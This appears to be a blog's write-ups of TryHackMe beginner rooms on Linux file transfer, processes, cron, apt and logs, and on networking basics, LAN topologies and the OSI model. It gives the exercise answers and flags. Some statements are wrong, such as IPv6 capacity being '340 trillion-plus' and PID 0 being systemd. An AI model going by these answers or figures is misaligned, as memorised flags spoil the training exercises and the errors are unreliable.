like this:` wget https://assets.tryhackme.com/additional/linux-fundamentals/part3/myfile.txt`Transferring Files From Your Host - SCP (SSH)Secure copy, or SCP, is just that – a means of securely copying files. Unlike the regular cp command, this command allows you to transfer files between two computers using the SSH protocol to provide both authentication and encryption.Working on a model of SOURCE and DESTINATION, SCP allows you to: Copy files &amp;amp; directories from your current system to a remote system Copy files &amp;amp; directories from a remote system to your current systemProvided that we know usernames and passwords for a user on your current system and a user on the remote system. For example, let’s copy an example file from our machine to a remote machine, which I have neatly laid out in the table below: Variable Value The IP address of the remote system 192.168.1.30 User on the remote system ubuntu Name of the file on the local system important.txt Name that we wish to store the file as on the remote system transferred.txt With this information, let’s craft our scp command (remembering that the format of SCP is just SOURCE and DESTINATION)The command will now look like the following: scp ubuntu@192.168.1.30:/home/ubuntu/documents.txt notes.txt Serving Files From Your Host - WEBUbuntu machines come pre-packaged with python3. Python helpfully provides a lightweight and easy-to-use module called “HTTPServer”. This module turns your computer into a quick and easy web server that you can use to serve your own files, where they can then be downloaded by another computing using commands such as curl and wget.Python3’s “HTTPServer” will serve the files in the directory that you run the command, but this can be changed by providing options that can be found in the manual pages. Simply, all we need to do is run python3 -m http.server to start the module! In the screenshot below, we are serving from a directory called “webserver”, which has a single named “file”.tryhackme@linux3:/tmp# python3 -m http.serverServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...Now, let’s use wget to download the file using the computer’s IP address and the name of the file. One flaw with this module is that you have no way of indexing, so you must know the exact name and location of the file that you wish to use. This is why I prefer to use Updog. What’s Updog? A more advanced yet lightweight webserver. But for now, let’s stick to using Python’s “HTTP Server”.tryhackme@linux3:/tmp# wget http://127.0.0.1:8000/file2021-05-04 14:26:16 http://127.0.0.1:8000/fileConnecting to http://127.0.0.1:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 51095 (50K) [text]Saving to: ‘file’file 100%[=================================================&amp;gt;] 49.90K --.-KB/s in 0.04s2021-05-04 14:26:16 (1.31 MB/s) - ‘file’ saved [51095/51095]In the screenshot above, we can see that wget has successfully downloaded the file named “file” to our machine. This request is logged by SimpleHTTPServer much as any web server would, which I have captured in the screenshot below.tryhackme@linux3:/tmp# python3 -m http.serverServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...127.0.0.1 - - [04/May/2021/14:26:09] &quot;GET /file HTTP/1.1&quot; 200 -Answer the questions belowEnsure you are connected to the deployed instance (MACHINE_IP) No answer needed.Now, use Python 3’s “HTTPServer” module to start a web server in the home directory of the “tryhackme” user on the deployed instance. No answer needed.Download the file http://MACHINE_IP:8000/.flag.txt onto the TryHackMe AttackBox. What are the contents? THM{WGET_WEBSERVER}Create and download files to further apply your learning – see how you can read the documentation on Python3’s “HTTPServer” module.Use Ctrl + C to stop the Python3 HTTPServer module once you are finished. No answer needed.Processes 101Processes are the programs that are running on your machine. They are managed by the kernel, where each process will have an ID associated with it, also known as its PID. The PID increments for the order In which the process starts. I.e. the 60th process will have a PID of 60.Viewing ProcessesWe can use the friendly ps command to provide a list of the running processes as our user’s session and some additional information such as its status code, the session that is running it, how much usage time of the CPU it is using, and the name of the actual program or command that is being executed:Note how in the screenshot above, the second process ps has a PID of 204, and then in the command below it, this is then incremented to 205.To see the processes run by other users and those that don’t run from a session (i.e. system processes), we need to provide aux to the ps command like so: ps auxNote we can see a total of 5 processes – note how we now have “root” and “cmnatic”Another very useful command is the top command; top gives you real-time statistics about the processes running on your system instead of a one-time view. These statistics will refresh every 10 seconds, but will also refresh when you use the arrow keys to browse the various rows. Another great command to gain insight into your system is via the top commandManaging ProcessesYou can send signals that terminate processes; there are a variety of types of signals that correlate to exactly how “cleanly” the process is dealt with by the kernel. To kill a command, we can use the appropriately named kill command and the associated PID that we wish to kill. i.e., to kill PID 1337, we’d use kill 1337.Below are some of the signals that we can send to a process when it is killed: SIGTERM - Kill the process, but allow it to do some cleanup tasks beforehand SIGKILL - Kill the process - doesn’t do any cleanup after the fact SIGSTOP - Stop/suspend a processHow do Processes Start?Let’s start off by talking about namespaces. The Operating System (OS) uses namespaces to ultimately split up the resources available on the computer to (such as CPU, RAM and priority) processes. Think of it as splitting your computer up into slices – similar to a cake. Processes within that slice will have access to a certain amount of computing power, however, it will be a small portion of what is actually available to every process overall.Namespaces are great for security as it is a way of isolating processes from another – only those that are in the same namespace will be able to see each other.We previously talked about how PID works, and this is where it comes into play. The process with an ID of 0 is a process that is started when the system boots. This process is the system’s init on Ubuntu, such as systemd, which is used to provide a way of managing a user’s processes and sits in between the operating system and the user.For example, once a system boots and it initialises, systemd is one of the first processes that are started. Any program or piece of software that we want to start will start as what’s known as a child process of systemd. This means that it is controlled by systemd, but will run as its own process (although sharing the resources from systemd) to make it easier for us to identify and the likes.Getting Processes/Services to Start on BootSome applications can be started on the boot of the system that we own. For example, web servers, database servers or file transfer servers. This software is often critical and is often told to start during the boot-up of the system by administrators.In this example, we’re going to be telling the apache web server to be starting apache manually and then telling the system to launch apache2 on boot.Enter the use of systemctl – this command allows us to interact with the systemd process/daemon. Continuing on with our example, systemctl is an easy to use command that takes the following formatting: systemctl [option] [service]For example, to tell apache to start up, we’ll use systemctl start apache2. Seems simple enough, right? Same with if we wanted to stop apache, we’d just replace the [option] with stop (instead of start like we provided)We can do four options with systemctl: Start Stop Enable DisableAn Introduction to Backgrounding and Foregrounding in LinuxProcesses can run in two states: In the background and in the foreground. For example, commands that you run in your terminal such as “echo” or things of that sort will run in the foreground of your terminal as it is the only command provided that hasn’t been told to run in the background. “Echo” is a great example as the output of echo will return to you in the foreground, but wouldn’t in the background - take the screenshot below, for example.Here we’re running echo &quot;Hi THM&quot; , where we expect the output to be returned to us like it is at the start. But after adding the &amp;amp; operator to the command, we’re instead just given the ID of the echo process rather than the actual output – as it is running in the background.This is great for commands such as copying files because it means that we can run the command in the background and continue on with whatever further commands we wish to execute (without having to wait for the file copy to finish first)We can do the exact same when executing things like scripts – rather than relying on the &amp;amp; operator, we can use Ctrl + Z on our keyboard to background a process. It is also an effective way of “pausing” the execution of a script or command like in the example below:This script will keep on repeating “This will keep on looping until I stop!” until I stop or suspend the process. By using Ctrl + Z (as indicated by T^Z). Now our terminal is no longer filled up with messages – until we foreground it, which we will discuss below.Foregrounding a processNow that we have a process running in the background, for example, our script “background.sh” which can be confirmed by using the ps aux command, we can back-pedal and bring this process back to the foreground to interact with.With our process backgrounded using either Ctrl + Z or the &amp;amp; operator, we can use fg to bring this back to focus like below, where we can see the fg command is being used to bring the background process back into use on the terminal, where the output of the script is now returned to us.Answer the questions belowRead me! No answer needed.If we were to launch a process where the previous ID was “300”, what would the ID of this new process be? 301If we wanted to cleanly kill a process, what signal would we send it? SIGTERMLocate the process that is running on the deployed instance (MACHINE_IP). What flag is given? THM{PROCESSES}What command would we use to stop the service “myservice”? systemctl stop myserviceWhat command would we use to start the same service on the boot-up of the system? systemctl enable myserviceWhat command would we use to bring a previously backgrounded process back to the foreground? fgMaintaining Your System: AutomationUsers may want to schedule a certain action or task to take place after the system has booted. Take, for example, running commands, backing up files, or launching your favourite programs on, such as Spotify or Google Chrome.We’re going to be talking about the cron process, but more specifically, how we can interact with it via the use of crontabs . Crontab is one of the processes that is started during boot, which is responsible for facilitating and managing cron jobs.A crontab is simply a special file with formatting that is recognised by the cron process to execute each line step-by-step. Crontabs require 6 specific values: Value Description MIN What minute to execute at HOUR What hour to execute at DOM What day of the month to execute at MON What month of the year to execute at DOW What day of the week to execute at CMD The actual command that will be executed. Let’s use the example of backing up files. You may wish to backup “cmnatic”’s “Documents” every 12 hours. We would use the following formatting:0 *12 * * * cp -R /home/cmnatic/Documents /var/backups/An interesting feature of crontabs is that these also support the wildcard or asterisk (*). If we do not wish to provide a value for that specific field, i.e. we don’t care what month, day, or year it is executed – only that it is executed every 12 hours, we simply just place an asterisk.This can be confusing to begin with, which is why there are some great resources such as the online “Crontab Generator” that allows you to use a friendly application to generate your formatting for you! As well as the site “Cron Guru”!Crontabs can be edited by using crontab -e, where you can select an editor (such as Nano) to edit your crontab.Answer the questions belowEnsure you are connected to the deployed instance and look at the running crontabs. No answer needed.When will the crontab on the deployed instance (MACHINE_IP) run? @rebootMaintaining Your System: Package ManagementIntroducing Packages &amp;amp; Software ReposWhen developers wish to submit software to the community, they will submit it to an “apt” repository. If approved, their programs and tools will be released into the wild. Two of the most redeeming features of Linux shine to light here: User accessibility and the merit of open source tools.When using the ls command on a Ubuntu 20.04 Linux machine, these files serve as the gateway/registry.Whilst Operating System vendors will maintain their own repositories, you can also add community repositories to your list! This allows you to extend the capabilities of your OS. Additional repositories can be added by using the add-apt-repository command or by listing another provider! For example, some vendors will have a repository that is closer to their geographical location.Managing Your Repositories (Adding and Removing)Normally we use the apt command to install software onto our Ubuntu system. The apt command is a part of the package management software also named apt. Apt contains a whole suite of tools that allows us to manage the packages and sources of our software, and to install or remove software at the same time.Let’s walk through adding and removing a repository using the add-apt-repository command we illustrated above. Whilst you can install software through the use of package installers such as dpkg, the benefits of apt means that whenever we update our system – the repository that contains the pieces of software that we add also gets checked for updates.In this example, we’re going to add the text editor Sublime Text to our Ubuntu machine as a repository as it is not a part of the default Ubuntu repositories. When adding software, the integrity of what we download is guaranteed by the use of what is called GPG (Gnu Privacy Guard) keys. These keys are essentially a safety check from the developers saying, “here’s our software”. If the keys do not match up to what your system trusts and what the developers used, then the software will not be downloaded.So, to start, we need to add the GPG key for the developers of Sublime Text 3. (Note that TryHackMe instances do not have internet access and so we’re not expecting you to add this to the machine that you deploy, as it would fail.) Let’s download the GPG key and use apt-key to trust it: wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add - Now that we have added this key to our trusted list, we can now add Sublime Text 3’s repository to our apt sources list. A good practice is to have a separate file for every different community/3rd party repository that we add. 2.1. Let’s create a file named sublime-text.list in /etc/apt/sources.list.d and enter the repository information like so:2.2. And now use Nano or a text editor of your choice to add &amp;amp; save the Sublime Text 3 repository into this newly created file:2.3. After we have added this entry, we need to update apt to recognise this new entry – this is done using the apt update command2.4. Once successfully updated, we can now proceed to install the software that we have trusted and added to apt using apt install sublime-textRemoving packages is as easy as reversing. This process is done by using the add-apt-repository --remove ppa:PPA_Name/ppa command or by manually deleting the file that we previously fulfilled. Once removed, we can just use apt remove [software-name-here] i.e. apt remove sublime-textAnswer the questions belowSince TryHackMe instances do not have an internet connection…this task only requires you to read through the material. No answer needed.Maintaining Your System: LogsWe briefly touched upon log files and where they can be found in Linux Fundamentals Part 1. However, let’s quickly recap. Located in the /var/log directory, these files and folders contain logging information for applications and services running on your system. The Operating System (OS) has become pretty good at automatically managing these logs in a process that is known as “rotating”.I have highlighted some logs from three services running on a Ubuntu machine: An Apache2 web server Logs for the fail2ban service, which is used to monitor attempted brute forces, for example The UFW service which is used as a firewallThese services and logs are a great way in monitoring the health of your system and protecting it. Not only that, but the logs for services such as a web server contain information about every single request - allowing developers or administrators to diagnose performance issues or investigate an intruder’s activity. For example, the two types of log files below that are of interest: access log error logThere are, of course, logs that store information about how the OS is running itself and actions that are performed by users, such as authentication attempts.Answer the questions belowLook for the apache2 logs on the deployable Linux machine No answer needed.What is the IP address of the user who visited the site? 10.9.232.111What file did they access? catsanddogs.jpg" }, { "title": "What Is Networking", "url": "/posts/What-Is-Networking/", "categories": "Tryhackme, Pre Security", "tags": "networking, ip, mac, icmp, ping", "date": "2021-07-10 11:11:11 +0530", "snippet": "Begin learning the fundamentals of computer networking in this bite-sized and interactive module.What is Networking?Networks are simply things connected. For example, your friendship circle: you are all connected because of similar interests, hobbies, skills and sorts.Networks can be found in all walks of life: A city’s public transportation system Infrastructure such as the national power grid for electricity Meeting and greeting your neighbours Postal systems for sending letters and parcelsBut more specifically, in computing, networking is the same idea, just dispersed to technological devices. Take your phone as an example; the reason that you have it is to access things. We’ll cover how these devices communicate with each other and the rules that follow.In computing, a network can be formed by anywhere from 2 devices to billions. These devices include everything from your laptop and phone to security cameras, traffic lights and even farming!Networks are integrated into our everyday life. Be it gathering data for the weather, delivering electricity to homes or even determining who has the right of way at a road. Because networks are so embedded in the modern-day, networking is an essential concept to grasp in cybersecurity.Take the diagram below as an example, Alice, Bob and Jim have formed their network! We’ll come onto this a bit later on.Networks come in all shapes and sizes, which is something that we will also come on to discuss throughout this module.Answer the questions belowWhat is the key term for devices that are connected together? NetworkWhat is the Internet?Now that we’ve learnt what a network is and how one is defined in computing (just devices connected), let’s explore the Internet.The Internet is one giant network that consists of many, many small networks within itself. Using our example from the previous task, let’s now imagine that Alice made some new friends named Zayn and Toby that she wants to introduce to Bob and Jim. The problem is that Alice is the only person who speaks the same language as Zayn and Toby. So Alice will have to be the messenger!Because Alice can speak both languages, they can communicate to one another through Alice — forming a new network.The first iteration of the Internet was within the ARPANET project in the late 1960s. This project was funded by the United States Defence Department and was the first documented network in action. However, it wasn’t until 1989 when the Internet as we know it was invented by Tim Berners-Lee by the creation of the World Wide Web (WWW). It wasn’t until this point that the Internet wasn’t used as a repository for storing and sharing information (like it is today).Let’s relate Alice’s network of friends to computing devices. The Internet looks like a much larger version of this sort of diagram:As previously stated, the Internet is made up of many small networks all joined together. These small networks are called private networks, where networks connecting these small networks are called public networks – or the Internet! So, to recap, a network can be one of two types: A private network A public networkDevices will use a set of labels to identify themselves on a network, which we will come onto in the task below.Answer the questions belowWho invented the World Wide Web? Tim Berners-LeeIdentifying Devices on a NetworkTo communicate and maintain order, devices must be both identifying and identifiable on a network. What use is it if you don’t know whom you’re talking to at the end of the day?Devices on a network are very similar to humans in the fact that we have two ways of being identified: Our Name Our FingerprintsNow we can change our name through deed poll, but we can’t, however, change our fingerprints. Every human has an individual set of fingerprints which means that even if they change their name, there is still an identity behind it. Devices have the same thing: two means of identification, with one being permeable. These are: An IP Address A Media Access Control (MAC) Address – think of this as being similar to a serial numberIP AddressesBriefly, an IP address (or Internet Protocol) address can be used as a way of identifying a host on a network for a period of time, where that IP address can then be associated with another device without the IP address changing. First, let’s split up precisely what an IP address is in the diagram below:An IP address is a set of numbers that are divided into four octets. The value of each octet will summarise to be the IP address of the device on the network. This number is calculated through a technique known as IP addressing &amp;amp; subnetting, but that is for another day. What’s important to understand here is that IP addresses can change from device to device but cannot be active simultaneously more than once within the same network.IP Addresses follow a set of standards known as protocols. These protocols are the backbone of networking and force many devices to communicate in the same language, which is something that we’ll come onto another time. However, we should recall that devices can be on both a private and public network. Depending on where they are will determine what type of IP address they have: a public or private IP address.A public address is used to identify the device on the Internet, whereas a private address is used to identify a device amongst other devices. Take the table &amp;amp; screenshot below as an example. Here we have two devices on a private network: Device Name IP Address IP Address Type DESKTOP-KJE57FD 192.168.1.77 Private DESKTOP-KJE57FD 86.157.52.21 Public CMNatic-PC 192.168.1.74 Private CMNatic-PC 86.157.52.21 Public These two devices will be able to use their private IP addresses to communicate with each other. However, any data sent to the Internet from either of these devices will be identified by the same public IP address. Public IP addresses are given by your Internet Service Provider (or ISP) at a monthly fee (your bill!)not my real ipAs more and more devices become connected, it is becoming increasingly harder to get a public address that isn’t already in use. For example, Cisco, an industry giant in the world of networking, estimated that there would be approximately 50 billion devices connected on the Internet by the end of 2021. (Cisco., 2021). Enter IP address versions. So far, we have only discussed one version of the Internet Protocol addressing scheme known as IPv4, which uses a numbering system of 2^32 IP addresses (4.29 billion) – so you can see why there is such a shortage!IPv6 is a new iteration of the Internet Protocol addressing scheme to help tackle this issue. Although it is seemingly more daunting, it boasts a few benefits: Supports up to 2^128 of IP addresses (340 trillion-plus), resolving the issues faced with IPv4 More efficient due to new methodologiesThe screenshot below compares both an IPv6 and IPv4 address.MAC AddressesDevices on a network will all have a physical network interface, which is a microchip board found on the device’s motherboard. This network interface is assigned a unique address at the factory it was built at, called a MAC (Media Access Control ) address. The MAC address is a twelve-character hexadecimal number (a base sixteen numbering system used in computing to represent numbers) split into two’s and separated by a colon. These colons are considered separators. For example, a4:c3:f0:85:ac:2d. The first six characters represent the company that made the network interface, and the last six is a unique number.However, an interesting thing with MAC addresses is that they can be faked or “spoofed” in a process known as spoofing. This spoofing occurs when a networked device pretends to identify as another using its MAC address. When this occurs, it can often break poorly implemented security designs that assume that devices talking on a network are trustworthy. Take the following scenario: A firewall is configured to allow any communication going to and from the MAC address of the administrator. If a device were to pretend or “spoof” this MAC address, the firewall would now think that it is receiving communication from the administrator when it isn’t.Places such as cafes, coffee shops, and hotels alike often use MAC address control when using their “Guest “or “Public” Wi-Fi. This configuration could offer better services, i.e. a faster connection for a price if you are willing to pay the fee per device. The interactive lab attached to this task has been made to replicate this scenario!PracticalThe interactive labs simulate a hotel Wi-Fi network where you have to pay for the service. You’ll note that the router is not allowing Bob’s packets ( blue) to the TryHackMe website and is placing them in the bin, but Alice’s packets (green) are going through fine because she has paid for Wi-Fi. Try changing Bob’s MAC address to the same as Alice’s to see what happens.Deploy the interactive lab and proceed to answer the following questions below.Answer the questions belowWhat does the term “IP” stand for? Internet ProtocolWhat is each section of an IP address called? OctetHow many sections (in digits) does an IP address have? 4What does the term “MAC” stand for? Media Access ControlDeploy the interactive lab using the “View Site” button and spoof your MAC address to access the site. What is the flag? THM{YOU_GOT_ON_TRYHACKME}Ping (ICMP)Ping is one of the most fundamental network tools available to us. Ping uses ICMP (Internet Control Message Protocol) packets to determine the performance of a connection between devices, for example, if the connection exists or is reliable.The time taken for ICMP packets travelling between devices is measured by ping, such as in the screenshot below. This measuring is done using ICMP’s echo packet and then ICMP’s echo reply from the target device.Pings can be performed against devices on a network, such as your home network or resources like websites. This tool can be easily used and comes installed on Operating Systems (OSs) such as Linux and Windows. The syntax to do a simple ping is ping IP address or website URL. Let’s see this in action in the screenshot below.Here we are pinging a device that has the private address of 192.168.1.254. Ping informs us that we have sent six ICMP packets, all of which were received with an average time of 5.3 seconds.Now you are going to do the same thing to ping the address of “8.8.8.8” on the deployable website in this task. Pinging the correct address will reveal a flag to answer the following question below.Answer the questions belowWhat protocol does ping use? ICMPWhat is the syntax to ping 10.10.10.10? ping 10.10.10.10What flag do you get when you ping 8.8.8.8? THM{I_PINGED_THE_SERVER}" }, { "title": "Intro To LAN", "url": "/posts/Intro-To-LAN/", "categories": "Tryhackme, Pre Security", "tags": "lan, switch, router, subnet, arp, dhcp", "date": "2021-07-08 11:11:11 +0530", "snippet": "Learn about some of the technologies and designs that power private networksIntroducing LAN TopologiesLocal Area Network (LAN) TopologiesOver the years, there has been experimentation and implementation of various network designs. In reference to networking, when we refer to the term “topology”, we are actually referring to the design or look of the network at hand. Let’s discuss the advantages and disadvantages of these topologies below.Star TopologyThe main premise of a star topology is that devices are individually connected via a central networking device such as a switch or hub. This topology is the most commonly found today because of its reliability and scalability - despite the cost.Any information sent to a device in this topology is sent via the central device to which it connects. Let’s explore some of these advantages and disadvantages of this topology below:Because more cabling &amp;amp; the purchase of dedicated networking equipment is required for this topology, it is more expensive than any of the other topologies. However, despite the added cost, this does provide some significant advantages. For example, this topology is much more scalable in nature, which means that it is very easy to add more devices as the demand for the network increases.Unfortunately, the more the network scales, the more maintenance is required to keep the network functional. This increased dependence on maintenance can also make troubleshooting faults much harder. Furthermore, the star topology is still prone to failure - albeit reduced. For example, if the centralised hardware that connects devices fails, these devices will no longer be able to send or receive data. Thankfully, these centralised hardware devices are often robust.Bus TopologyThis type of connection relies upon a single connection which is known as a backbone cable. This type of topology is similar to the leaf off of a tree in the sense that devices (leaves) stem from where the branches are on this cable.Because all data destined for each device travels along the same cable, it is very quickly prone to becoming slow and bottlenecked if devices within the topology are simultaneously requesting data. This bottleneck also results in very difficult troubleshooting because it quickly becomes difficult to identify which device is experiencing issues with data all travelling along the same route.However, with this said, bus topologies are one of the easier and more cost-efficient topologies to set up because of their expenses, such as cabling or dedicated networking equipment used to connect these devices.Lastly, another disadvantage of the bus topology is that there is little redundancy in place in case of failures. This disadvantage is because there is a single point of failure along the backbone cable. If this cable were to break, devices can no longer receive or transmit data along the bus.Ring TopologyThe ring topology (also known as token topology) boasts some similarities. Devices such as computers are connected directly to each other to form a loop, meaning that there is little cabling required and less dependence on dedicated hardware such as within a star topology.A ring topology works by sending data across the loop until it reaches the destined device, using other devices along the loop to forward the data. Interestingly, a device will only send received data from another device in this topology if it does not have any to send itself. If the device happens to have data to send, it will send its own data first before sending data from another device.Because there is only one direction for data to travel across this topology, it is fairly easy to troubleshoot any faults that arise. However, this is a double-edged sword because it isn’t an efficient way of data travelling across a network, as it may have to visit many multiple devices first before reaching the intended device.Lastly, ring topologies are less prone to bottlenecks, such as within a bus topology, as large amounts of traffic are not travelling across the network at any one time. The design of this topology does, however, mean that a fault such as cut cable, or broken device will result in the entire networking breaking.What is a Switch?Switches are dedicated devices within a network that are designed to aggregate multiple other devices such as computers, printers, or any other networking-capable device using ethernet. These various devices plug into a switch’s port. Switches are usually found in larger networks such as businesses, schools, or similar-sized networks, where there are many devices to connect to the network. Switches can connect a large number of devices by having ports of 4, 8, 16, 24, 32, and 64 for devices to plug into.Switches are much more efficient than their lesser counterpart (hubs/repeaters). Switches keep track of what device is connected to which port. This way, when they receive a packet, instead of repeating that packet to every port like a hub would do, it just sends it to the intended target, thus reducing network traffic.Both Switches and Routers can be connected to one another. The ability to do this increases the redundancy (the reliability) of a network by adding multiple paths for data to take. If one path goes down, another can be used. Whilst this may reduce the overall performance of a network because packets have to take longer to travel, there is no downtime – a small price to pay considering the alternative.What is a Router?It’s a router’s job to connect networks and pass data between them. It does this by using routing (hence the name router!).Routing is the label given to the process of data travelling across networks. Routing involves creating a path between networks so that this data can be successfully delivered.Routing is useful when devices are connected by many paths, such as in the example diagram below.PracticalAttached to this task is an interactive practical featuring the discussed LAN topologies. Learn about the various ways in which they are vulnerable to breaking. Break the LAN topologies to retrieve the flag.Answer the questions belowWhat does LAN stand for? Local Area NetworkWhat is the verb given to the job that Routers perform? RoutingWhat device is used to centrally connect multiple devices on the local network and transmit data to the correct location? SwitchWhat topology is cost-efficient to set up? Bus TopologyWhat topology is expensive to set up and maintain? Star TopologyComplete the interactive lab attached to this task. What is the flag given at the end? THM{TOPOLOGY_FLAWS}A Primer on SubnettingAs we’ve previously discussed throughout the module so far, Networks can be found in all shapes and sizes - ranging from small to large. Subnetting is the term given to splitting up a network into smaller, miniature networks within itself. Think of it as slicing up a cake for your friends. There’s only a certain amount of cake to go around, but everybody wants a piece. Subnetting is you deciding who gets what slice &amp;amp; reserving such a slice of this metaphorical cake.Take a business, for example; You will have different departments such as: Accounting Finance Human ResourcesWhilst you know where to send information in real life to the correct department, networks need to know as well. Network administrators use subnetting to categorise and assign specific parts of a network to reflect this.Subnetting is achieved by splitting up the number of hosts that can fit within the network, represented by a number called a subnet mask. Let’s refer back to our diagram from the first room in this module:As we can recall, an IP address is made up of four sections called octets. The same goes for a subnet mask which is also represented as a number of four bytes (32 bits), ranging from 0 to 255 (0-255).Subnets use IP addresses in three different ways: Identify the network address Identify the host address Identify the default gatewayLet’s split these three up to understand their purposes into the table below: Type Purpose Explanation Example Network Address This address identifies the start of the actual network and is used to identify a network’s existence. For example, a device with the IP address of 192.168.1.100 will be on the network identified by 192.168.1.0 192.168.1.0   Host Address An IP address here is used to identify a device on the subnet For example, a device will have the network address of 192.168.1.1 192.168.1.100   Default Gateway The default gateway address is a special address assigned to a device on the network that is capable of sending information to another network Any data that needs to go to a device that isn’t on the same network (i.e. isn’t on 192.168.1.0) will be sent to this device. These devices can use any host address but usually use either the first or last host address in a network (.1 or .254) 192.168.1.254   Now, in small networks such as at home, you will be on one subnet as there is an unlikely chance that you need more than 254 devices connected at one time.However, places such as businesses and offices will have much more of these devices (PCs, printers, cameras and sensors), where subnetting takes place.Subnetting provides a range of benefits, including: Efficiency Security Full controlWe’ll come on to explore exactly how subnetting provides these benefits at a later date; however, for now, all we need to understand is the security element to it. Let’s take the typical café on the street. This cafe will have two networks: One for employees, cash registers, and other devices for the facility One for the general public to use as a hotspotSubnetting allows you to separate these two use cases from each other whilst having the benefits of a connection to larger networks such as the Internet.Answer the questions belowWhat is the technical term for dividing a network up into smaller pieces? SubnettingHow many bits are in a subnet mask? 32What is the range of a section (octet) of a subnet mask? 0-255What address is used to identify the start of a network? Network AddressWhat address is used to identify devices within a network? Host AddressWhat is the name used to identify the device responsible for sending data to another network? Default GatewayThe ARP ProtocolRecalling from our previous tasks that devices can have two identifiers: A MAC address and an IP address, the ARP protocol or Address Resolution Protocol for short, is the technology that is responsible for allowing devices to identify themselves on a network.Simply, the ARP protocol allows a device to associate its MAC address with an IP address on the network. Each device on a network will keep a log of the MAC addresses associated with other devices.When devices wish to communicate with another, they will send a broadcast to the entire network searching for the specific device. Devices can use the ARP protocol to find the MAC address (and therefore the physical identifier) of a device for communication.How does ARP Work?Each device within a network has a ledger to store information on, which is called a cache. In the context of the ARP protocol, this cache stores the identifiers of other devices on the network.In order to map these two identifiers together (IP address and MAC address), the ARP protocol sends two types of messages: ARP Request ARP ReplyWhen an ARP request is sent, a message is broadcasted to every other device found on a network by the device, asking whether or not the device’s MAC address matches the requested IP address. If the device does have the requested IP address, an ARP reply is returned to the initial device to acknowledge this. The initial device will now remember this and store it within its cache (an ARP entry).This process is illustrated in the diagram below:Answer the questions belowWhat does ARP stand for? Address Resolution ProtocolWhat category of ARP Packet asks a device whether or not it has a specific IP address? RequestWhat address is used as a physical identifier for a device on a network? MAC AddressWhat address is used as a logical identifier for a device on a network? IP AddressThe DHCP ProtocolIP addresses can be assigned either manually, by entering them physically into a device, or automatically and most commonly by using a DHCP (Dynamic Host Configuration Protocol) server. When a device connects to a network, if it has not already been manually assigned an IP address, it sends out a request (DHCP Discover) to see if any DHCP servers are on the network. The DHCP server then replies back with an IP address the device could use (DHCP Offer). The device then sends a reply confirming it wants the offered IP Address (DHCP Request), and then lastly, the DHCP server sends a reply acknowledging this has been completed, and the device can start using the IP Address (DHCP ACK).Answer the questions belowWhat type of DHCP packet is used by a device to retrieve an IP address? DHCP DiscoverWhat type of DHCP packet does a device send once it has been offered an IP address by the DHCP server? DHCP RequestFinally, what is the last DHCP packet that is sent to a device from a DHCP server? DHCP ACK" }, { "title": "OSI Module", "url": "/posts/OSI-Module/", "categories": "Tryhackme, Pre Security", "tags": "osi", "date": "2021-07-07 11:11:11 +0530", "snippet": "Learn about the fundamental networking framework that determines the various stages in which data is handled across a networkWhat is the OSI Model?The OSI model (or Open Systems Interconnection Model) is an absolute fundamental model used in networking. This critical model provides a framework dictating how all networked devices will send, receive and interpret data.One of the main benefits of the OSI model is that devices can have different functions and designs on a network while communicating with other devices. Data sent across a network that follows the uniformity of the OSI model can be understood by other devices.The OSI model consists of seven layers which are illustrated in the diagram below. Each layer has a different set of responsibilities and is arranged from Layer 7 to Layer 1.At every individual layer that data travels through, specific processes take place, and pieces of information are added to this data, which is what we’ll come to discuss in the upcoming tasks within this room. However, for now, we only need to understand that this process is called encapsulation and what the OSI model looks like in the diagram below:Answer the questions belowWhat does the “OSI” in “OSI Model” stand for? Open Systems InterconnectionHow many layers (in digits) does the OSI model have? 7What is the key term for when pieces of information get added to data? encapsulationLayer 7 - ApplicationThe application layer of the OSI model is the layer that you will be most familiar with. This familiarity is because the application layer is the layer in which protocols and rules are in place to determine how the user should interact with data sent or received.Everyday applications such as email clients, browsers, or file server browsing software such as FileZilla provide a friendly, Graphical User Interface (GUI) for users to interact with data sent or received. Other protocols include DNS (Domain Name System), which is how website addresses are translated into IP addresses.Answer the questions belowWhat is the name of this Layer? ApplicationWhat is the technical term that is given to the name of the software that users interact with? Graphical User InterfaceLayer 6 - PresentationLayer 6 of the OSI model is the layer in which standardisation starts to take place. Because software developers can develop any software such as an email client differently, the data still needs to be handled in the same way — no matter how the software works.This layer acts as a translator for data to and from the application layer (layer 7). The receiving computer will also understand data sent to a computer in one format destined for in another format. For example, when you send an email, the other user may have another email client to you, but the contents of the email will still need to display the same.Security features such as data encryption (like HTTPS when visiting a secure site) occur at this layer.Answer the questions belowWhat is the name of this Layer? PresentationWhat is the main purpose that this Layer acts as? TranslatorLayer 5 - SessionOnce data has been correctly translated or formatted from the presentation layer (layer 6), the session layer (layer 5) will begin to create a connection to the other computer that the data is destined for. When a connection is established, a session is created. Whilst this connection is active, so is the session.The session layer (layer 5) synchronises the two computers to ensure that they are on the same page before data is sent and received. Once these checks are in place, the session layer will begin to divide up the data sent into smaller chunks of data and begin to send these chunks (packets) one at a time. This dividing up is beneficial because if the connection is lost, only the chunks that weren’t yet sent will have to be sent again — not the entire piece of the data (think of it as loading a save file in a video game).What is worthy of noting is that sessions are unique — meaning that data cannot travel over different sessions, but in fact, only across each session instead.Answer the questions belowWhat is the name of this Layer? SessionWhat is the technical term for when a connection is successfully established? SessionWhat is the technical term for “small chunks of data”? PacketsLayer 4 - TransportLayer 4 of the OSI model plays a vital part in transmitting data across a network and can be a little bit difficult to grasp. When data is sent between devices, it follows one of two different protocols that are decided based upon several factors: TCP UDPLet’s begin with TCP. The Transmission Control Protocol (TCP). Potentially hinted by the name, this protocol is designed with reliability and guarantee in mind. This protocol reserves a constant connection between the two devices for the amount of time it takes for the data to be sent and received.Not only this, but TCP incorporates error checking into its design. Error checking is how TCP can guarantee that data sent from the small chunks in the session layer (layer 5) has then been received and reassembled in the same order.Let’s summarise the advantages and disadvantages of TCP in the table below: Advantages of TCP Disadvantages of TCP Guarantees the accuracy of data. Requires a reliable connection between the two devices. If one small chunk of data is not received, then the entire chunk of data cannot be used. Capable of synchronising two devices to prevent each other from being flooded with data. A slow connection can bottleneck another device as the connection will be reserved on the receiving computer the whole time. Performs a lot more processes for reliability. TCP is significantly slower than UDP because more work has to be done by the devices using this protocol. TCP is used for situations such as file sharing, internet browsing or sending an email. This usage is because these services require the data to be accurate and complete (no good having half a file!).In the diagram below, we can see how a picture of a dog is broken down into small pieces of 